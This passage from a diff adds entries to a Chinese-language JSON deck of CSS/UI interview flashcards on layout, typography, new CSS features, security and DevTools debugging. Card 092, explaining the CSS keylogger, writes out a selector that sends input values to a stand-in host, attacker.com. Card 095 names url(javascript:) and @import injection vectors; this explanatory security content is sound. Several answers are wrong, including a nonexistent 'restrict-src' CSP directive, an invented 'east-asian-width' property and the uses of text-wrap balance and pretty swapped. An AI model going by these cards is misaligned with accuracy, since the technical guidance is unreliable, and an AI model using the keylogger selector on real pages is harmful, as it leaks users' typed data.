+      "front_concept": "white-space: pre-wrap 与 pre-line 在处理换行符和空格上的区别？",
+      "hints": ["空格保留", "换行符", "文本折叠"],
+      "back_explanation": "结论：pre-wrap 保留空格和换行，pre-line 合并空格但保留换行。\n核心机制：\n1. pre-wrap 类似 <pre> 但允许自动换行。\n2. pre-line 忽略连续空格，适合诗歌或地址。\n最佳实践：用户生成内容（UGC）通常用 pre-wrap 保持格式。",
+      "difficulty": "intermediate",
+      "tags": ["Text", "White Space", "Formatting"]
+    },
+    {
+      "id": "css_ui-flashcard-052",
+      "front_concept": "实现多行文本省略号（line-clamp）的标准 CSS 写法及 Webkit 私有属性依赖？",
+      "hints": ["box-orient", "flex 容器", "溢出隐藏"],
+      "back_explanation": "结论：需配合 display: -webkit-box 和 -webkit-line-clamp。\n核心机制：\n1. 依赖 Webkit 内核特性。\n2. 必须设置 overflow: hidden。\n最佳实践：虽然是非标准，但兼容性极好；未来可用 overflow-block: auto 替代。",
+      "difficulty": "advanced",
+      "tags": ["Text Overflow", "Line Clamp", "Webkit"]
+    },
+    {
+      "id": "css_ui-flashcard-053",
+      "front_concept": "zoom: 50% 与 transform: scale(0.5) 在布局影响上的根本区别？",
+      "hints": ["布局缩放", "视觉缩放", "非标准属性"],
+      "back_explanation": "结论：zoom 改变布局尺寸，transform 仅视觉缩放。\n核心机制：\n1. zoom 影响文档流计算（非标准）。\n2. transform 不影响周围元素布局。\n最佳实践：避免使用 zoom，使用 transform 实现视觉缩放，使用 width/height 改变布局。",
+      "difficulty": "advanced",
+      "tags": ["Zoom", "Transform", "Layout"]
+    },
+    {
+      "id": "css_ui-flashcard-054",
+      "front_concept": "如何使用 CSS 计数器（counter-increment）实现自定义列表编号，而不依赖 ol 标签？",
+      "hints": ["伪元素", "计数器作用域", "content"],
+      "back_explanation": "结论：在父级 counter-reset，子级 counter-increment，伪元素 content 显示。\n核心机制：\n1. 计数器类似变量，可嵌套作用域。\n2. 完全控制编号样式。\n最佳实践：用于复杂目录、多级列表样式定制。",
+      "difficulty": "advanced",
+      "tags": ["Counters", "Lists", "Pseudo Elements"]
+    },
+    {
+      "id": "css_ui-flashcard-055",
+      "front_concept": "all: unset 在 CSS Reset 中的作用？与 all: initial 的区别？",
+      "hints": ["继承重置", "默认值", "全局清除"],
+      "back_explanation": "结论：unset 将继承属性恢复为继承值，非继承属性恢复为初始值。\n核心机制：\n1. initial 强制所有属性为初始值（切断继承）。\n2. unset 更智能，保留颜色等继承属性。\n最佳实践：组件隔离样式时使用 all: unset 清除外部污染。",
+      "difficulty": "advanced",
+      "tags": ["Reset", "All", "Unset"]
+    },
+    {
+      "id": "css_ui-flashcard-056",
+      "front_concept": "HTML 设置 dir=\"rtl\" 后，Flexbox 布局的起始方向会发生什么变化？如何强制保持 LTR？",
+      "hints": ["主轴方向", "writing-mode", "flex-direction"],
+      "back_explanation": "结论：Flex 主轴起点会自动翻转为从右向左。\n核心机制：\n1. Flex 遵循书写方向。\n2. 需显式设置 flex-direction: row 保持从左向右。\n最佳实践：国际化布局中检查 Flex 方向，必要时显式声明方向。",
+      "difficulty": "advanced",
+      "tags": ["RTL", "Flexbox", "Direction"]
+    },
+    {
+      "id": "css_ui-flashcard-057",
+      "front_concept": "visibility: collapse 在普通元素和表格行（tr）上的表现差异？",
+      "hints": ["空间占用", "表格布局", "隐藏行为"],
+      "back_explanation": "结论：普通元素同 hidden 占位，表格行会移除空间。\n核心机制：\n1. 表格行 collapse 类似 display: none。\n2. 普通元素 collapse 退化為 hidden。\n最佳实践：仅用于表格行隐藏，普通元素请用 none 或 hidden。",
+      "difficulty": "advanced",
+      "tags": ["Visibility", "Table", "Collapse"]
+    },
+    {
+      "id": "css_ui-flashcard-058",
+      "front_concept": "image-rendering: pixelated 在放大低分辨率图片时的作用？适用场景？",
+      "hints": ["邻近插值", "锯齿保留", "像素艺术"],
+      "back_explanation": "结论：禁用平滑算法，保持像素硬边缘。\n核心机制：\n1. 默认放大使用双线性插值（模糊）。\n2. pixelated 使用最近邻插值（锯齿）。\n最佳实践：像素游戏、图标放大、复古风格设计。",
+      "difficulty": "intermediate",
+      "tags": ["Image", "Rendering", "Pixel Art"]
+    },
+    {
+      "id": "css_ui-flashcard-059",
+      "front_concept": "accent-color 属性能控制哪些表单控件的颜色？局限性是什么？",
+      "hints": ["原生控件", "复选框", "完全定制"],
+      "back_explanation": "结论：控制 checkbox, radio, progress 等原生强调色。\n核心机制：\n1. 简化表单样式定制。\n2. 无法完全控制内部结构（如边框细节）。\n最佳实践：简单主题切换用 accent-color，复杂定制需隐藏原生用伪元素重绘。",
+      "difficulty": "intermediate",
+      "tags": ["Forms", "Accent Color", "UI Controls"]
+    },
+    {
+      "id": "css_ui-flashcard-060",
+      "front_concept": "@property 定义变量类型时，syntax: '<length>' 与 syntax: '*' 的区别？类型检查对动画的影响？",
+      "hints": ["严格模式", "插值支持", "无效值"],
+      "back_explanation": "结论：'<length>' 开启类型检查，'*' 为通配符。\n核心机制：\n1. 指定类型后，无效值会被忽略，动画可插值。\n2. 通配符无法进行动画插值。\n最佳实践：需要动画过渡的变量必须指定具体 syntax 类型。",
+      "difficulty": "advanced",
+      "tags": ["CSS Houdini", "Property", "Type Checking"]
+    },
+    {
+      "id": "css_ui-flashcard-061",
+      "front_concept": "@layer 规则如何改变 CSS 层叠顺序？未命名样式与命名层之间的优先级关系是什么？",
+      "hints": ["层叠上下文", "优先级队列", "未命名层"],
+      "back_explanation": "结论：@layer 创建命名层，层间优先级由定义顺序决定，层内优先级由特异性决定。\n核心机制：\n1. 未命名样式（无@layer）优先级最高。\n2. 命名层之间，后定义的层优先级高于先定义的层。\n3. 层内特异性不跨层比较。\n最佳实践：利用@layer 管理第三方库样式，避免特异性战争。",
+      "difficulty": "advanced",
+      "tags": ["Cascade Layers", "Specificity", "Architecture"]
+    },
+    {
+      "id": "css_ui-flashcard-062",
+      "front_concept": "@scope 规则相比传统的 BEM 命名或 CSS Modules，在样式隔离上的核心优势？",
+      "hints": ["DOM 范围", "选择器边界", "原生隔离"],
+      "back_explanation": "结论：@scope 允许在 CSS 中直接定义样式生效的 DOM 范围，无需类名前缀。\n核心机制：\n1. 语法 @scope (.scope-root) { ... }。\n2. 样式仅在该根节点子树内生效。\n3. 支持下限选择器（to）。\n最佳实践：用于微前端或组件库隔离，减少类名污染。",
+      "difficulty": "advanced",
+      "tags": ["Scope", "Isolation", "Selectors"]
+    },
+    {
+      "id": "css_ui-flashcard-063",
+      "front_concept": "@starting-style 规则解决了 CSS 过渡（Transition）中的什么痛点？",
+      "hints": ["初始状态", "进入动画", "display 切换"],
+      "back_explanation": "结论：允许元素从 display: none 变为可见时触发动画。\n核心机制：\n1. 传统 transition 无法检测 display: none 到 block 的变化。\n2. @starting-style 定义元素刚加入渲染树时的初始值。\n3. 浏览器自动计算从初始值到当前值的过渡。\n最佳实践：用于模态框、下拉菜单的进入动画。",
+      "difficulty": "advanced",
+      "tags": ["Transition", "Starting Style", "Animation"]
+    },
+    {
+      "id": "css_ui-flashcard-064",
+      "front_concept": "View Transitions API 中 ::view-transition-old 和 ::view-transition-new 伪元素的作用？",
+      "hints": ["页面切换", "快照对比", "动画钩子"],
+      "back_explanation": "结论：分别代表过渡前后的页面快照，用于编写切换动画。\n核心机制：\n1. 浏览器自动捕获旧视图和新视图。\n2. 通过伪元素控制两者的混合、位移或透明度。\n3. 需配合 JS document.startViewTransition 使用。\n最佳实践：实现 SPA 路由切换或列表项排序的平滑过渡。",
+      "difficulty": "advanced",
+      "tags": ["View Transitions", "Pseudo Elements", "SPA"]
+    },
+    {
+      "id": "css_ui-flashcard-065",
+      "front_concept": "animation-timeline: scroll() 如何实现滚动驱动动画？相比 JS 监听 scroll 事件的优势？",
+      "hints": ["时间轴", "主线程", "合成器"],
+      "back_explanation": "结论：将滚动进度直接映射为动画进度，无需 JS 计算。\n核心机制：\n1. 滚动位置作为动画时间轴。\n2. 运行在合成线程，避免主线程阻塞。\n3. 自动处理节流和帧同步。\n最佳实践：用于阅读进度条、视差滚动、滚动揭示动画。",
+      "difficulty": "advanced",
+      "tags": ["Scroll Timeline", "Animation", "Performance"]
+    },
+    {
+      "id": "css_ui-flashcard-066",
+      "front_concept": "Anchor Positioning (position-anchor) 解决了 Tooltip 或 Popover 定位中的什么难题？",
+      "hints": ["相对定位", "溢出检测", "自动翻转"],
+      "back_explanation": "结论：允许元素相对于另一个非父级元素定位，并自动处理溢出翻转。\n核心机制：\n1. 通过 anchor-name 和 position-anchor 关联。\n2. 支持 position-try 定义 fallback 位置。\n3. 无需 JS 计算坐标。\n最佳实践：替代 Popper.js 等库，实现纯 CSS 智能提示框。",
+      "difficulty": "advanced",
+      "tags": ["Anchor Positioning", "Layout", "Tooltip"]
+    },
+    {
+      "id": "css_ui-flashcard-067",
+      "front_concept": "OKLCH 颜色空间相比 RGB/HSL 在 perceptual uniformity（感知均匀性）上的优势？",
+      "hints": ["人眼感知", "亮度恒定", "色域"],
+      "back_explanation": "结论：OKLCH 基于人眼感知设计，改变色相时亮度保持一致。\n核心机制：\n1. RGB 改变色相会导致感知亮度变化。\n2. OKLCH 的 L 通道独立于 C（彩度）和 H（色相）。\n3. 支持更广的 P3 色域。\n最佳实践：生成配色方案、状态色变体时优先使用 OKLCH。",
+      "difficulty": "advanced",
+      "tags": ["Color", "OKLCH", "Accessibility"]
+    },
+    {
+      "id": "css_ui-flashcard-068",
+      "front_concept": "相对颜色语法（Relative Color Syntax）如 oklch(from var(--color) l c h) 的核心用途？",
+      "hints": ["颜色转换", "通道提取", "动态调整"],
+      "back_explanation": "结论：允许在 CSS 中解析并修改现有颜色的单个通道。\n核心机制：\n1. from 关键字提取源颜色通道。\n2. 可跨空间转换（如 rgb 转 oklch）。\n3. 支持数学运算修改通道值。\n最佳实践：动态生成悬停色、阴影色，无需预定义所有变体。",
+      "difficulty": "advanced",
+      "tags": ["Color", "Relative Syntax", "Variables"]
+    },
+    {
+      "id": "css_ui-flashcard-069",
+      "front_concept": "原生 CSS Nesting (& 选择器) 与 Sass 嵌套在编译输出上的主要区别？",
+      "hints": ["浏览器解析", "特异性计算", "作用域"],
+      "back_explanation": "结论：原生嵌套由浏览器解析，无需编译，特异性计算规则略有不同。\n核心机制：\n1. 必须使用 & 显式引用父选择器。\n2. 不支持 Sass 的静默注释或混合宏。\n3. 特异性基于最终展开的选择器。\n最佳实践：现代项目可直接使用原生嵌套，减少构建依赖。",
+      "difficulty": "intermediate",
+      "tags": ["Nesting", "Syntax", "Specificity"]
+    },
+    {
+      "id": "css_ui-flashcard-070",
+      "front_concept": "Popover API 中 popover 属性与 dialog 元素在行为上的核心区别？",
+      "hints": ["模态性", "轻弹行为", "堆叠"],
+      "back_explanation": "结论：popover 默认非模态，支持多个同时打开；dialog 默认模态。\n核心机制：\n1. popover 支持 light dismiss（点击外部关闭）。\n2. 自动提升到顶层堆叠上下文。\n3. 无需 JS 管理 z-index。\n最佳实践：用于下拉菜单、提示框、非模态通知。",
+      "difficulty": "advanced",
+      "tags": ["Popover", "HTML API", "UI"]
+    },
+    {
+      "id": "css_ui-flashcard-071",
+      "front_concept": "contain: paint 属性如何优化复杂组件的渲染性能？副作用？",
+      "hints": ["绘制隔离", "溢出裁剪", "重绘范围"],
+      "back_explanation": "结论：告诉浏览器元素内部变化不影响外部，限制重绘范围。\n核心机制：\n1. 元素内容溢出被视为裁剪。\n2. 内部动画不会触发外部重绘。\n3. 类似 overflow: hidden 但语义更强。\n最佳实践：用于独立卡片、广告组件、频繁更新的内容区。",
+      "difficulty": "advanced",
+      "tags": ["Contain", "Performance", "Paint"]
+    },
+    {
+      "id": "css_ui-flashcard-072",
+      "front_concept": "font-variation-settings 属性如何控制可变字体（Variable Fonts）的轴？",
+      "hints": ["轴标签", "权重宽度", "自定义轴"],
+      "back_explanation": "结论：直接设置字体变体轴的数值，如 'wght' 400, 'wdth' 100。\n核心机制：\n1. 支持标准轴（wght, wdth, ops, sl, ital）。\n2. 支持字体设计师自定义轴。\n3. 可动画化，实现平滑粗细过渡。\n最佳实践：替代多个 font-weight 文件，减少 HTTP 请求。",
+      "difficulty": "advanced",
+      "tags": ["Variable Fonts", "Typography", "Performance"]
+    },
+    {
+      "id": "css_ui-flashcard-073",
+      "front_concept": "text-wrap: balance 与 text-wrap: pretty 在文本排版上的区别？",
+      "hints": ["换行算法", "行数限制", "视觉效果"],
+      "back_explanation": "结论：balance 使每行字符数均衡，pretty 防止标题末尾孤词。\n核心机制：\n1. balance 适用于短段落，计算开销大。\n2. pretty 适用于标题，仅优化最后两行。\n最佳实践：标题用 pretty，短引言用 balance，长文本默认 auto。",
+      "difficulty": "advanced",
+      "tags": ["Typography", "Text Wrap", "Layout"]
+    },
+    {
+      "id": "css_ui-flashcard-074",
+      "front_concept": "field-sizing: content 属性如何解决 textarea 高度自适应问题？",
+      "hints": ["自动增长", "滚动条", "替代 JS"],
+      "back_explanation": "结论：允许表单控件根据内容自动调整尺寸，无需 JS。\n核心机制：\n1. 默认 fixed，改为 content 后高度随内容变化。\n2. 达到最大高度前不出现滚动条。\n最佳实践：聊天输入框、评论框，替代传统的 JS 高度计算。",
+      "difficulty": "advanced",
+      "tags": ["Forms", "Textarea", "Layout"]
+    },
+    {
+      "id": "css_ui-flashcard-075",
+      "front_concept": "CSS 颜色插值中 color-interpolation-method: longer hue 的作用？",
+      "hints": ["色相环", "过渡路径", "彩虹效果"],
+      "back_explanation": "结论：强制色相过渡走色相环的长路径，产生彩虹效果。\n核心机制：\n1. 默认走最短路径（如红到紫直接变）。\n2. longer hue 绕远路（红->橙->黄->绿->蓝->紫）。\n最佳实践：用于背景渐变动画，增加视觉丰富度。",
+      "difficulty": "advanced",
+      "tags": ["Color", "Interpolation", "Animation"]
+    },
+    {
+      "id": "css_ui-flashcard-076",
+      "front_concept": "steps() 缓动函数中 start 与 end 关键字对动画帧的影响？",
+      "hints": ["阶梯跳变", "第一帧", "最后一帧"],
+      "back_explanation": "结论：start 立即跳变到下一阶，end 保持当前阶直到结束。\n核心机制：\n1. steps(4, end) 第一帧保持初始状态。\n2. steps(4, start) 第一帧立即变化。\n最佳实践：精灵图动画通常用 start，加载进度条用 end。",
+      "difficulty": "advanced",
+      "tags": ["Animation", "Easing", "Steps"]
+    },
+    {
+      "id": "css_ui-flashcard-077",
+      "front_concept": "offset-path (motion-path) 结合 offset-rotate: auto 实现什么效果？",
+      "hints": ["路径跟随", "切线方向", "物体朝向"],
+      "back_explanation": "结论：元素沿路径移动时，自动旋转以匹配路径切线方向。\n核心机制：\n1. offset-path 定义运动轨迹。\n2. offset-rotate: auto 计算路径斜率。\n3. 类似汽车沿弯道行驶。\n最佳实践：地图图标移动、轨道动画、游戏角色移动。",
+      "difficulty": "advanced",
+      "tags": ["Motion Path", "Animation", "Transform"]
+    },
+    {
+      "id": "css_ui-flashcard-078",
+      "front_concept": "composite 属性在 Web Animations API 和 CSS 中的用途？与 mix-blend-mode 区别？",
+      "hints": ["合成操作", "动画叠加", "端口混合"],
+      "back_explanation": "结论：控制动画帧如何与底层内容合成，而非元素间混合。\n核心机制：\n1. 值如 add, replace, accumulate。\n2. accumulate 允许动画迭代累加效果。\n3. mix-blend-mode 是元素整体与背景混合。\n最佳实践：用于多次触发动画的效果累加。",
+      "difficulty": "advanced",
+      "tags": ["Composite", "Animation", "Blending"]
+    },
+    {
+      "id": "css_ui-flashcard-079",
+      "front_concept": "isolation: isolate 属性在混合模式（mix-blend-mode）中的必要性？",
+      "hints": ["新堆叠上下文", "混合范围", "背景穿透"],
+      "back_explanation": "结论：强制创建新堆叠上下文，防止混合模式影响祖先元素。\n核心机制：\n1. 默认 mix-blend-mode 会与身后所有内容混合。\n2. isolation 限制混合仅在当前组内。\n最佳实践：使用混合模式时务必添加，避免污染全局背景。",
+      "difficulty": "advanced",
+      "tags": ["Isolation", "Blend Mode", "Stacking"]
+    },
+    {
+      "id": "css_ui-flashcard-080",
+      "front_concept": "mix-blend-mode: difference 与 exclusion 在颜色计算上的视觉差异？",
+      "hints": ["反相", "亮度对比", "黑色影响"],
+      "back_explanation": "结论：difference 对比度更高，exclusion 更柔和。\n核心机制：\n1. difference: |底色 - 混合色|。\n2. exclusion: 底色 + 混合色 - 2*底色*混合色。\n3. 黑色在 difference 下完全反相，exclusion 下不变。\n最佳实践：difference 用于校验重叠，exclusion 用于艺术效果。",
+      "difficulty": "advanced",
+      "tags": ["Blend Mode", "Color", "Graphics"]
+    },
+    {
+      "id": "css_ui-flashcard-081",
+      "front_concept": "background-clip: text 实现文字渐变填充时，为何需要设置 color: transparent？",
+      "hints": ["前景色遮挡", "绘制顺序", "标准行为"],
+      "back_explanation": "结论：文字默认前景色会覆盖背景裁剪区域。\n核心机制：\n1. background-clip 仅控制背景绘制范围。\n2. 文字本身仍有颜色。\n3. 设 transparent 让背景透出来。\n最佳实践：标准写法需配合 -webkit-text-fill-color: transparent。",
+      "difficulty": "intermediate",
+      "tags": ["Background Clip", "Text", "Gradient"]
+    },
+    {
+      "id": "css_ui-flashcard-082",
+      "front_concept": "mask-image 与 clip-path 在性能和非矩形裁剪上的优劣对比？",
+      "hints": ["Alpha 通道", "几何计算", "渐变支持"],
+      "back_explanation": "结论：mask 支持渐变透明度，clip-path 仅硬边缘。\n核心机制：\n1. mask 基于 Alpha 通道，可羽化。\n2. clip-path 基于几何路径，计算更快。\n3. mask 开销略大但效果更丰富。\n最佳实践：硬边缘用 clip-path，柔边/渐变遮罩用 mask。",
+      "difficulty": "advanced",
+      "tags": ["Mask", "Clip Path", "Performance"]
+    },
+    {
+      "id": "css_ui-flashcard-083",
+      "front_concept": "clip-path: polygon() 坐标百分比是相对于元素盒子还是视口？",
+      "hints": ["参考系", "边框盒", "响应式"],
+      "back_explanation": "结论：相对于元素自身的参考盒（默认 border-box）。\n核心机制：\n1. 0 0 为左上角，100% 100% 为右下角。\n2. 随元素尺寸变化自动缩放。\n最佳实践：制作响应式几何图形无需媒体查询。",
+      "difficulty": "intermediate",
+      "tags": ["Clip Path", "Polygon", "Box Model"]
+    },
+    {
+      "id": "css_ui-flashcard-084",
+      "front_concept": "shape-outside 属性配合 float 实现什么特殊布局效果？局限性？",
+      "hints": ["文本环绕", "浮动元素", "形状定义"],
+      "back_explanation": "结论：使内联内容沿浮动元素的形状环绕，而非矩形盒。\n核心机制：\n1. 需配合 float: left/right。\n2. 支持 circle, polygon, url(image)。\n3. 仅影响内联内容，不影响块级。\n最佳实践：杂志风格排版、图片文字混排。",
+      "difficulty": "advanced",
+      "tags": ["Shape Outside", "Float", "Layout"]
+    },
+    {
+      "id": "css_ui-flashcard-085",
+      "front_concept": "initial-letter 属性实现首字下沉时，如何控制下沉行数和占用宽度？",
+      "hints": ["排版属性", "行数", "宽度倍数"],
+      "back_explanation": "结论：initial-letter: 3 2 表示下沉 3 行，占用 2 个字符宽。\n核心机制：\n1. 第一个值：下沉行数。\n2. 第二个值：占用宽度倍数。\n3. 自动调整周围文本环绕。\n最佳实践：文章开头装饰，替代图片首字。",
+      "difficulty": "advanced",
+      "tags": ["Typography", "Initial Letter", "Drop Cap"]
+    },
+    {
+      "id": "css_ui-flashcard-086",
+      "front_concept": "hanging-punctuation: first 属性在中文排版中的作用？",
+      "hints": ["标点悬挂", "边缘对齐", "视觉整洁"],
+      "back_explanation": "结论：将行首/行尾标点悬挂到边距外，保持文本块对齐。\n核心机制：\n1. 引号、逗号等不占用行内空间。\n2. 视觉边缘更整齐。\n3. 需浏览器支持（目前 Safari 较好）。\n最佳实践：高质量文章排版、电子书阅读界面。",
+      "difficulty": "advanced",
+      "tags": ["Typography", "Punctuation", "CJK"]
+    },
+    {
+      "id": "css_ui-flashcard-087",
+      "front_concept": "ruby-position: over 与 under 在注音排版上的区别？默认值？",
+      "hints": ["注音位置", "汉字上方", "汉字下方"],
+      "back_explanation": "结论：over 在汉字上方（默认），under 在汉字下方。\n核心机制：\n1. 用于 <ruby> 标签。\n2. over 符合中文习惯，under 符合日文部分习惯。\n最佳实践：中文注音保持默认 over，特殊需求改 under。",
+      "difficulty": "intermediate",
+      "tags": ["Ruby", "Typography", "CJK"]
+    },
+    {
+      "id": "css_ui-flashcard-088",
+      "front_concept": "text-combine-upright: all 在竖排文本中如何实现横排数字？",
+      "hints": ["纵中横", "字符压缩", "竖排模式"],
+      "back_explanation": "结论：将多个字符压缩在一个字符宽度内，横向显示。\n核心机制：\n1. 仅当 writing-mode: vertical 时生效。\n2. 用于日期、编号等短文本。\n3. 避免竖排中数字占用过长空间。\n最佳实践：竖排书籍、传统风格网页的日期显示。",
+      "difficulty": "advanced",
+      "tags": ["Writing Mode", "Text Combine", "CJK"]
+    },
+    {
+      "id": "css_ui-flashcard-089",
+      "front_concept": "east-asian-width: full-width 属性对半角字符的影响？",
+      "hints": ["字符宽度", "全角转换", "对齐"],
+      "back_explanation": "结论：强制半角字符显示为全角宽度。\n核心机制：\n1. 不影响字符编码，仅影响渲染宽度。\n2. 用于对齐中西文混排。\n3. 类似视觉上的空格填充。\n最佳实践：表格数据对齐、表单固定宽度输入。",
+      "difficulty": "advanced",
+      "tags": ["Typography", "East Asian", "Width"]
+    },
+    {
+      "id": "css_ui-flashcard-090",
+      "front_concept": "print-color-adjust: exact 在打印样式表中的作用？为何浏览器默认会忽略背景色？",
+      "hints": ["打印优化", "墨水节省", "强制渲染"],
+      "back_explanation": "结论：强制浏览器打印背景色和图片，默认为了省墨会忽略。\n核心机制：\n1. 浏览器默认移除背景以节省墨水。\n2. 设置 exact 告知用户需要精确颜色。\n3. 需配合 -webkit-print-color-adjust。\n最佳实践：打印发票、票据、图表时务必添加。",
+      "difficulty": "advanced",
+      "tags": ["Print", "Media Query", "Background"]
+    },
+    {
+      "id": "css_ui-flashcard-091",
+      "front_concept": "为何通过 :visited 伪类可以推断用户浏览历史？现代浏览器限制了哪些属性以防止隐私泄露？",
+      "hints": ["隐私保护", "样式限制", "计算样式"],
+      "back_explanation": "结论：浏览器限制了 :visited 可修改的属性以防隐私泄露。\n核心机制：\n1. 仅允许 color, background-color 等少数视觉属性。\n2. getComputedStyle 强制返回未访问样式值。\n3. 无法通过 JS 读取真实访问状态。\n防坑指南：不要依赖 :visited 做逻辑判断或布局变化。",
+      "difficulty": "advanced",
+      "tags": ["Security", "Privacy", "Visited"]
+    },
+    {
+      "id": "css_ui-flashcard-092",
+      "front_concept": "CSS 属性选择器如何被利用实现'键盘记录'攻击（CSS Keylogger）？防护方案？",
+      "hints": ["属性选择器", "外部资源", "输入值"],
+      "back_explanation": "结论：通过属性选择器匹配 input 值，触发背景图请求泄露数据。\n核心机制：\n1. input[value^='a'] { background: url(attacker.com/a) }。\n2. 逐个字符匹配，通过请求日志还原输入内容。\n最佳实践：对敏感输入框添加 CSP restrict-src，或随机化属性名。",
+      "difficulty": "advanced",
+      "tags": ["Security", "Keylogger", "Selectors"]
+    },
+    {
+      "id": "css_ui-flashcard-093",
+      "front_concept": "当内联样式失效且控制台报错，但语法正确时，可能是哪个 CSP 指令在拦截？",
+      "hints": ["安全策略", "内联块", "哈希白名单"],
+      "back_explanation": "结论：style-src 指令默认禁止内联样式。\n核心机制：\n1. CSP 防止 XSS 攻击，阻止 inline style 执行。\n2. 需使用 nonce 或 hash 白名单放行。\n3. 'unsafe-inline' 会降低安全性。\n最佳实践：避免内联样式，使用外部 stylesheet 或 nonce 机制。",
+      "difficulty": "advanced",
+      "tags": ["Security", "CSP", "Inline Style"]
+    },
+    {
+      "id": "css_ui-flashcard-094",
+      "front_concept": "user-select: none 能否真正防止内容被复制？底层原理及绕过方式？",
+      "hints": ["交互限制", "DOM 访问", "无障碍"],
+      "back_explanation": "结论：仅防止鼠标交互选择，无法防止 DOM 访问或截图。\n核心机制：\n1. 仅禁用 UI 层的选择行为。\n2. 用户仍可通过控制台、阅读器、截图 OCR 获取。\n3. 可能影响无障碍工具。\n最佳实践：仅用于 UX 优化（如防止误选），不可用于版权保护。",
+      "difficulty": "advanced",
+      "tags": ["Security", "User Select", "UX"]
+    },
+    {
+      "id": "css_ui-flashcard-095",
+      "front_concept": "URL 参数中包含恶意 CSS 代码如何导致样式注入攻击？哪些属性高风险？",
+      "hints": ["背景图片", "表达式", "外部资源"],
+      "back_explanation": "结论：用户可控的样式值若直接插入 style 标签可执行恶意 CSS。\n核心机制：\n1. background-image: url(javascript:...) 旧浏览器支持。\n2. 结合 @import 加载外部恶意样式。\n3. 诱导用户复制敏感数据。\n最佳实践：严禁将用户输入直接插入 style 属性或标签，需严格转义。",
+      "difficulty": "advanced",
+      "tags": ["Security", "Injection", "XSS"]
+    },
+    {
+      "id": "css_ui-flashcard-096",
+      "front_concept": "富文本编辑器中允许用户自定义样式类名会带来什么安全风险？",
+      "hints": ["类名碰撞", "全局污染", "样式覆盖"],
+      "back_explanation": "结论：用户可能定义与系统关键类名相同的类，破坏布局或隐藏元素。\n核心机制：\n1. 全局 CSS 命名空间污染。\n2. 恶意覆盖 .admin-panel { display: none }。\n最佳实践：使用 CSS Modules 或命名空间前缀隔离用户样式，沙箱化渲染。",
+      "difficulty": "advanced",
+      "tags": ["Security", "Sanitization", "CSS Modules"]
+    },
+    {
+      "id": "css_ui-flashcard-097",
+      "front_concept": "CSS 中加载跨域字体或图片时，CORS 配置错误会导致什么渲染问题？",
+      "hints": [" tainted canvas", "静默失败", "Access-Control"],
+      "back_explanation": "结论：跨域资源未配 CORS 会导致字体静默加载失败或 Canvas 污染。\n核心机制：\n1. 字体跨域需服务器配 Access-Control-Allow-Origin。\n2. 否则回退到系统字体，影响布局一致性。\n最佳实践：CDN 资源务必配置 CORS 头，字体使用 font-display 降级。",
+      "difficulty": "advanced",
+      "tags": ["Security", "CORS", "Fonts"]
+    },
+    {
+      "id": "css_ui-flashcard-098",
+      "front_concept": "CSP 的 report-uri 指令在现代浏览器中的替代方案是什么？为何被弃用？",
+      "hints": ["报告端点", "Report-To", "HTTP 头"],
+      "back_explanation": "结论：被 report-to 指令替代，支持更丰富的报告组配置。\n核心机制：\n1. report-uri 仅支持单一 URL。\n2. report-to 支持分组、优先级、持久化。\n最佳实践：同时配置两者以兼容旧浏览器，优先使用 report-to。",
+      "difficulty": "advanced",
+      "tags": ["Security", "CSP", "Reporting"]
+    },
+    {
+      "id": "css_ui-flashcard-099",
+      "front_concept": "Chrome DevTools 中 Layers 面板显示过多绿色方块代表什么性能隐患？",
+      "hints": ["合成层", "内存占用", "GPU 负担"],
+      "back_explanation": "结论：代表创建了过多的合成层（Compositor Layers），消耗显存。\n核心机制：\n1. 每个层独立占用 GPU 内存。\n2. 层间通信开销大，导致滚动卡顿。\n最佳实践：检查 will-change, transform, fixed 定位，合并不必要的层。",
+      "difficulty": "advanced",
+      "tags": ["Debugging", "DevTools", "Performance"]
+    },
+    {
+      "id": "css_ui-flashcard-100",
+      "front_concept": "CSS Coverage 工具显示大量未使用样式，但删除后功能异常，原因是什么？",
+      "hints": ["动态类名", "JS 操作", "状态切换"],
+      "back_explanation": "结论：动态通过 JS 添加的类名在初始加载时未被计入。\n核心机制：\n1. Coverage 仅记录当前会话命中的选择器。\n2. 交互后触发的类名初始显示为未使用。\n最佳实践：交互触发所有状态后再分析，或结合静态代码分析工具。",
+      "difficulty": "advanced",
+      "tags": ["Debugging", "Coverage", "Dynamic"]
+    },
+    {
+      "id": "css_ui-flashcard-101",
+      "front_concept": "Performance 面板中绿色的 Paint 条纹代表什么？如何优化？",
+      "hints": ["重绘区域", "合成层", "更新频率"],
+      "back_explanation": "结论：代表屏幕发生了重绘（Paint），绿色越宽面积越大。\n核心机制：\n1. 频繁大面积重绘消耗 CPU。\n2. 理想情况是仅重绘变化区域。\n最佳实践：使用 transform/opacity 触发合成，避免触发 Paint 的属性。",
+      "difficulty": "advanced",
+      "tags": ["Debugging", "Performance", "Paint"]
+    },
+    {
+      "id": "css_ui-flashcard-102",
+      "front_concept": "Rendering 面板中的 Paint Flashing 功能有何用途？开启后满屏闪烁说明什么？",
+      "hints": ["可视化重绘", "性能瓶颈", "布局抖动"],
+      "back_explanation": "结论：高亮显示重绘区域，满屏闪烁说明存在大面积无效重绘。\n核心机制：\n1. 帮助定位非必要的样式更新。\n2. 常见于全局动画或频繁读取 offsetTop。\n最佳实践：结合 Performance 面板定位具体样式属性，隔离动画层。",
+      "difficulty": "advanced",
+      "tags": ["Debugging", "Rendering", "Visualization"]
+    },
+    {
+      "id": "css_ui-flashcard-103",
+      "front_concept": "Layout Shift Regions 功能如何辅助优化 CLS（累积布局偏移）？",
+      "hints": ["视觉稳定性", "偏移框", "核心指标"],
+      "back_explanation": "结论：可视化显示导致布局偏移的具体元素区域。\n核心机制：\n1. 标记发生位置变化的 DOM 节点。\n2. 帮助识别图片未定尺寸、字体加载跳变等问题。\n最佳实践：为媒体元素预留空间，使用 font-display: optional。",
+      "difficulty": "advanced",
+      "tags": ["Debugging", "CLS", "Core Web Vitals"]
+    },
+    {
+      "id": "css_ui-flashcard-104",
+      "front_concept": "DevTools 中 3D View 模式在调试 z-index 层叠问题时的独特价值？",
+      "hints": ["深度视角", "堆叠上下文", "层级可视化"],
+      "back_explanation": "结论：直观展示元素在 Z 轴上的实际分布，揭示隐藏的层叠上下文。\n核心机制：\n1. 平面视图无法看出 transform 创建的层。\n2. 3D 视图可看到元素是否在同一平面。\n最佳实践：调试遮罩、弹窗层级问题时开启，快速定位父级上下文。",
+      "difficulty": "advanced",
+      "tags": ["Debugging", "3D View", "Z-Index"]
+    },
+    {
+      "id": "css_ui-flashcard-105",
+      "front_concept": "Network 水线图中 CSS 文件阻塞渲染的判定标准是什么？如何识别关键 CSS？",
+      "hints": ["渲染阻塞", "加载顺序", "FCP"],
